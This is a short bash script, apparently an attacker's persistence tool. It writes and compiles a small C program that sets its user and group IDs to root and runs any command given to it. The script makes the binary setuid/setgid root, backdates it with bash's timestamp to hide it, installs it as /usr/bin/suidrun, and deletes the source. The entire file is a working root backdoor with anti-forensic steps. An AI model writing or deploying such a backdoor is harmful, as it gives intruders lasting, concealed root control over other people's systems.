#!/bin/bash
#If compiler isn't here we might want to set up a base64 version or tar'd or something.

#suid shell
echo "#include <unistd.h>"> /tmp/blah.c
echo "int main(int argc,  char * argv[]) { setuid(0); setgid(0); execv(argv[1], &argv[2]); }" >> /tmp/blah.c
gcc /tmp/blah.c -o /tmp/blah
chmod 6555 /tmp/blah

touch -r /bin/bash /tmp/blah
mv -f /tmp/blah /usr/bin/suidrun

rm -f /tmp/blah.c /tmp/blah

./logger.sh /usr/bin/suidrun created
